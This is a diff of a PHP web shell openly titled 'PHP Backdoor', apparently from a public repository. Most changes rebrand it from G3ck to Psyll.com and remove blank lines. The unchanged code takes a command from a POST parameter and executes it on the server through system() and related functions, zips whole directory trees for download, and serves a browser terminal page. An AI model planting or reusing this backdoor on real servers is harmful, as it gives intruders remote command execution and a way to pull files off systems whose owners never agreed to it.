@@ -1,18 +1,12 @@
 <?php
 /*
-
-	 ██████╗ ██████╗  ██████╗██╗  ██╗    ██████╗ ███████╗██╗   ██╗    ████████╗███████╗ █████╗ ███╗   ███╗
-	██╔════╝ ╚════██╗██╔════╝██║ ██╔╝    ██╔══██╗██╔════╝██║   ██║    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
-	██║  ███╗ █████╔╝██║     █████╔╝     ██║  ██║█████╗  ██║   ██║       ██║   █████╗  ███████║██╔████╔██║
-	██║   ██║ ╚═══██╗██║     ██╔═██╗     ██║  ██║██╔══╝  ╚██╗ ██╔╝       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
-	╚██████╔╝██████╔╝╚██████╗██║  ██╗    ██████╔╝███████╗ ╚████╔╝        ██║   ███████╗██║  ██║██║ ╚═╝ ██║
-	 ╚═════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝    ╚═════╝ ╚══════╝  ╚═══╝         ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
-
-	 Project name: PHP Backdoor
-	 Description: Web-based application that allows to execute terminal commands on a server directly from a browser
-	 Authors: Jarek <jarek@psyll.com>, Psyll.com Dev Team <dev@g3ck.com>
-	 Github: https://g3ck.github.io/PHP-Backdoor
-	 License: MIT
+	█▀█ █▀ █▄█ █░░ █░░ ░ █▀▀ █▀█ █▀▄▀█
+	█▀▀ ▄█ ░█░ █▄▄ █▄▄ ▄ █▄▄ █▄█ █░▀░█
+	Project: PHP Backdoor
+	Description: Web-based application that allows to execute terminal commands on a server directly from a browser
+	Authors: Jarek <jarek@psyll.com>, Psyll.com Dev Team <dev@g3ck.com>
+	Homepage: https://psyll.github.io/PHP-Backdoor/
+	License: MIT
 */
 // Get current command
 // if command posted
@@ -27,23 +21,18 @@ endif;
 function answer($data){
 	die(json_encode($data));
 }
-
 function archive($path){
-
 	// Get real path for our folder
 	$rootPath = $path;
-
 	// Initialize archive object
 	$zip = new ZipArchive();
 	$zip->open('file.zip', ZipArchive::CREATE | ZipArchive::OVERWRITE);
-
 	// Create recursive directory iterator
 	/** @var SplFileInfo[] $files */
 	$files = new RecursiveIteratorIterator(
 		new RecursiveDirectoryIterator($rootPath),
 		RecursiveIteratorIterator::LEAVES_ONLY
 	);
-
 	foreach ($files as $name => $file)
 	{
 		// Skip directories (they would be added automatically)
@@ -52,24 +41,18 @@ function archive($path){
 			// Get real and relative path for current file
 			$filePath = $file->getRealPath();
 			$relativePath = substr($filePath, strlen($rootPath) + 1);
-
 			// Add current file to archive
 			$zip->addFile($filePath, $relativePath);
 		}
 	}
-
 	// Zip archive will be created only after closing object
 	$zip->close();
 	$answer = array("Archive created");
 	answer($answer);
 }
-
-
 // Check if is ajax request. If yes, start terminal command
 if (isset( $_POST['command'])):
-
 	$command = $_POST['command'];
-
 		// Check functions
 		// Try: system
 		if(function_exists('system'))
@@ -132,13 +115,11 @@ else:
 	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 	<meta name="robots" CONTENT="noindex,nofollow">
 	<meta name="distribution" content="IU">
-	<meta name="copyright" content="G3ck Dev Team, dev@g3ck.com">
-	<meta name="author" content="Jarek, jarek@g3ck.com">
-	<meta name="author" content="Jarek, jarek@g3ck.com">
-	<meta name="owner" content="G3ck Dev Team, dev@g3ck.com">
-	<title>PHP Terminal [g3ck.com]</title>
+	<meta name="copyright" content="Psyll.com, jarek@psyll.com">
+	<meta name="author" content="Jarek Szulc, jarek@psyll.com">
+	<meta name="owner" content="Jarek Szulc, jarek@psyll.com">
+	<title>PHP Terminal [psyll.com]</title>
 	<style>
-
 			* {
 				font-family: monospace
 			}
@@ -152,7 +133,6 @@ else:
 				margin: 0;
 				overflow: hidden;
 			}
-
 			body {
 				overflow-x: hidden;
 				overflow-y: auto
@@ -160,13 +140,11 @@ else:
 			section#terminal {
 				margin: 15px
 			}
-
 			#console {
 				list-style: none;
 				padding: 0;
 				margin: 0
 			}
-
 			#console li {
 				position: relative;
 				width: 99%;
@@ -177,10 +155,8 @@ else:
 				padding: 2px 0 2px 15px;
 				cursor: default !important;
 			}
-
 			#console li:not(.answer) {
 			}
-
 			#console li::before {
 				content: " ~ ";
 				position: absolute;
@@ -188,21 +164,17 @@ else:
 				top: 1px;
 				color: green
 			}
-
 			#console li.answer {
 				color: #ffd623;
 				font-weight: 400
 			}
-
 			#console li.answer.error {
 				color: #ff2323
 			}
-
 			#input {
 				padding: 2px 0 2px 15px;
 				position: relative
 			}
-
 			#input::before {
 				content: " ~ ";
 				position: absolute;
@@ -210,12 +182,10 @@ else:
 				top: 1px;
 				color: green
 			}
-
 			#input::before {
 				transition-property: transform;
 				transition-duration: 1s
 			}
-
 			#input.waiting::before {
 				animation-name: rotate;
 				animation-duration: 2s;
@@ -240,7 +210,6 @@ else:
 				color: #fff;
 				font-family: 'Roboto Mono', monospace
 			}
-
 	</style>
 </head>
 <body>
@@ -264,7 +233,7 @@ else:
 		// Welcome message
 		function welcome(){
 			var div = document.getElementById('console');
-			div.innerHTML += '<li class="answer">PHP Backdoor by G3ck.com</li>';
+			div.innerHTML += '<li class="answer">PHP Backdoor by Psyll.com</li>';
 			div.innerHTML += '<li class="answer">Licensed under MIT License</li>';
 		}
 		// Submit a command by jjax
@@ -296,7 +265,6 @@ else:
 				  answer('Unexpected response format');
 				}
 		      }
-
 		    };
 		    xhttp.open("POST", window.location.href, true);
 		    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
